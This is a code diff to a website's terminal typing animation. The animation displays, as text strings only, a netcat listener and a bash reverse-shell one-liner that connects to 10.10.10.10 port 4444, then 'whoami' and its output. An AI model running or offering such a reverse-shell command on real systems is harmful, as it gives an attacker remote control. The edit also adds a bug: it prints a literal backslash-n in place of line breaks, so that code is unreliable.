@@ -32,40 +32,47 @@
 
 
 
-// Robust terminal typing animation
+
+
+// Robust terminal typing animation v2 (no "undefined", full lines)
 (function(){
   const A = document.querySelector('[data-ty="a"]');
   const B = document.querySelector('[data-ty="b"]');
   if(!A || !B) return;
 
   const seqA = [
-    "ncat -lvnp 4444",
+    "attacker@razor$ ncat -lvnp 4444",
     "listening on [any] 4444 ...",
     "connection received from 10.10.10.42"
   ];
   const seqB = [
-    "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
-    "whoami",
+    "victim@host$ bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
+    "victim@host$ whoami",
     "www-data"
   ];
 
-  function typeLine(el, text, charDelay){
+  function typeLine(el, text, delay){
     return new Promise(resolve=>{
-      let i=0;
-      function tick(){
-        el.textContent += text[i++];
-        if(i <= text.length){ setTimeout(tick, charDelay); }
-        else{ el.textContent += "\n"; resolve(); }
+      let i = 0;
+      function step(){
+        if(i < text.length){
+          el.textContent += text[i];
+          i++;
+          setTimeout(step, delay);
+        }else{
+          el.textContent += "\\n";
+          resolve();
+        }
       }
-      tick();
+      step();
     });
   }
 
   async function runOnce(){
     A.textContent = ""; B.textContent = "";
     for (let i=0;i<Math.max(seqA.length, seqB.length);i++){
-      if(seqA[i]) await typeLine(A, seqA[i], 32);
-      if(seqB[i]) await typeLine(B, seqB[i], 32);
+      if(seqA[i]) await typeLine(A, seqA[i], 28);
+      if(seqB[i]) await typeLine(B, seqB[i], 28);
     }
   }
 
@@ -73,12 +80,9 @@
   if(!grid){ runOnce(); return; }
   let played = false;
   const io = new IntersectionObserver((entries)=>{
-    for(const e of entries){
-      if(e.isIntersecting && !played){
-        played = true;
-        runOnce();
-      }
-    }
-  }, {threshold:.2});
+    entries.forEach(e=>{
+      if(e.isIntersecting && !played){ played = true; runOnce(); }
+    });
+  }, {threshold:.15});
   io.observe(grid);
 })();
